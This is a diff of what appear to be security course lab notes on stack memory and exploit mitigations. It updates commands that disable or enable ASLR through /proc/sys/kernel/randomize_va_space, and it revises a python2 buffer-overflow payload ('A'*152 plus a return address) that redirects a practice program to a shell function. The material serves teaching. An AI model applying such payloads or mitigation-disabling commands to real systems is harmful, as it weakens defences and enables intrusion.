@@ -60,10 +60,11 @@ Memory and the Stack
 			Which addresses changed?
 			
 		Turn on ASLR and try again
-			echo 1 >| /proc/sys/kernel/randomize_va_space # note the space after '1'!
+			echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
+			Or as root -- echo 1 >| /proc/sys/kernel/randomize_va_space # note the space after '1'!
 		
 		Turn off ASLR and try again
-			echo 0 >| /proc/sys/kernel/randomize_va_space
+			echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 	
 		
 Exploit Mitigations and Bypasses
@@ -73,7 +74,7 @@ Exploit Mitigations and Bypasses
 			# Old standard allows extremely vulnerable "gets" function to be used
 		
 		Turn off ASLR
-			echo 0 >| /proc/sys/kernel/randomize_va_space
+			echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 		
 		Run the program
 			./wisdom_e0.out
@@ -96,7 +97,9 @@ Exploit Mitigations and Bypasses
 			(gdb) print shell
 		
 		Print escaped attack code to call shell function
-			python -c 'print "A"*152 + r"\xfc\x85\x04\x08"'
+			#0x56556271
+			python2 -c 'print "A"*152 + r"\x71\x62\x55\x56"'
+			# Should do this with struct.pack when running without runescape.sh, to avoid typos
 
 		Execute program while escaping input
 			chmod +x runescape.sh
